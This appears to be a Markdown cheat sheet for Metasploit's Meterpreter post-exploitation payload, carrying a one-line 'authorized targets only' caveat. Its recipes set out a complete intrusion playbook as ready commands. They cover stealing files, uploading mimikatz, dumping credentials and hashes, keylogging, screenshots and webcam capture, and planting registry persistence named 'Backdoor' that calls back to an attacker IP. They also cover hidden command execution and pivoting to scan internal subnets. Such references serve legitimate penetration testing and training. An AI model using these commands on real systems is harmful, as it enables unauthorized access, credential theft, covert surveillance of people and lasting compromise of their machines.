# Meterpreter

> Advanced Metasploit payload for post-exploitation. Use only on authorized targets.

## Quickstart

```text
# In msfconsole - list and interact with sessions
sessions -l
sessions -i <id>

# First commands in meterpreter
?                 # list all commands
sysinfo           # system info
getuid            # current user
pwd               # current directory
ps                # process list (Windows)
shell             # drop to OS shell
background        # return to msfconsole
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Session | Active Meterpreter connection |
| Channel | Sub-connection (shell, file transfer) |
| Extension | Loadable modules (stdapi, priv, etc.) |
| Background | Keep session alive, return to msf |

## Session Management (msfconsole)

| Command | Description |
|---------|-------------|
| `sessions -l` | List active sessions |
| `sessions -i <id>` | Interact with session |
| `sessions -u <id>` | Upgrade shell to Meterpreter |
| `sessions -k <id>` | Kill session |

## Core Commands

### System Info

| Command | Description |
|---------|-------------|
| `?` / `help` | List available commands |
| `sysinfo` | OS and system details |
| `getuid` | Current user |
| `getpid` | Current process ID |
| `getsystem` | Attempt privilege escalation |

### File System

| Command | Description |
|---------|-------------|
| `pwd` | Print working directory |
| `cd <dir>` | Change directory |
| `ls` / `dir` | List files |
| `cat <file>` | View file contents |
| `download <remote> [local]` | Download file |
| `upload <local> [remote]` | Upload file |
| `rm <file>` | Delete file |
| `mkdir <dir>` | Create directory |
| `search -f <pattern>` | Find files |

### Process Management

| Command | Description |
|---------|-------------|
| `ps` | List processes |
| `getpid` | Current process ID |
| `migrate <pid>` | Migrate to another process |
| `execute -f <cmd>` | Run command |
| `kill <pid>` | Kill process |
| `shell` | Drop to system shell |

### Network

| Command | Description |
|---------|-------------|
| `ipconfig` / `ifconfig` | Network interfaces |
| `netstat` | Network connections |
| `arp` | ARP cache |
| `route` | Routing table |
| `portfwd` | Port forwarding |

### Pivoting

| Command | Description |
|---------|-------------|
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Forward port |
| `portfwd list` | List forwards |
| `portfwd delete -l <lport>` | Remove forward |

## Recipes

### Initial Triage

```text
# Basic info gathering
sysinfo
getuid
pwd
ipconfig
route
netstat
ps
```

### File Operations

```text
# Navigate and list
cd C:\\Users\\Administrator\\Desktop
ls

# Download file
download C:\\Users\\Administrator\\Desktop\\secrets.txt /tmp/secrets.txt

# Upload tool
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Temp\\m.exe

# Find files
search -f *.txt -d C:\\Users
search -f web.config -d C:\\inetpub
search -f *.kdbx
```

### Privilege Escalation

```text
# Check current privileges
getuid

# Attempt auto privesc
getsystem

# If failed, try specific techniques
getsystem -t 1   # Named pipe impersonation
getsystem -t 2   # Named pipe impersonation (alt)
```

### Process Migration

```text
# List processes
ps

# Migrate to stable process
migrate <pid>

# Migrate to explorer.exe (stable)
ps | grep explorer
migrate <explorer_pid>

# Migrate to x64 process if needed
ps -A x86_64
migrate <pid>
```

### Credential Harvesting

```text
# Load mimikatz extension
load kiwi

# Dump creds
creds_all
creds_msv
creds_kerberos

# Dump SAM
hashdump
```

### Port Forwarding (Pivoting)

```text
# Forward local 8080 to remote host's 80
portfwd add -l 8080 -p 80 -r 192.168.1.100

# Forward local 3389 to remote RDP
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# List forwards
portfwd list

# Remove forward
portfwd delete -l 8080
```

### Keylogging & Screenshots

```text
# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam (if available)
webcam_list
webcam_snap
```

### Persistence

```text
# Run persistence script
run persistence -U -i 5 -p 4444 -r <attacker_ip>

# Manual registry persistence
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\Temp\\payload.exe"
```

### Shell & Commands

```text
# System shell
shell

# Run single command
execute -f cmd.exe -a "/c whoami"
execute -f powershell.exe -a "-NoP -Command Get-Process"

# Run with hidden window
execute -f cmd.exe -a "/c net user" -H
```

### Routing Through Session

```text
# In msfconsole (not meterpreter)
route add 192.168.1.0/24 <session_id>
route print

# Then run modules through the pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run
```

## Session Upgrades

```text
# In msfconsole - upgrade basic shell
sessions -l
sessions -u <shell_session_id>

# Background and return
background
sessions -i <new_meterpreter_id>
```

## Resource Scripts

```text
# Create triage.rc
cat > triage.rc << EOF
sysinfo
getuid
ipconfig
route
netstat
ps
EOF

# Run in meterpreter
resource triage.rc
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Command not found | Check `?`, load extension with `load` |
| Session dies | Migrate to stable process |
| Upgrade fails | Try different payload, check architecture |
| getsystem fails | Try other techniques (`-t`), check AV |

## References

- [Meterpreter Docs](https://docs.rapid7.com/metasploit/meterpreter/)
- [Meterpreter Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [Post-Exploitation with Meterpreter](https://www.hackingarticles.in/meterpreter-cheat-sheet/)
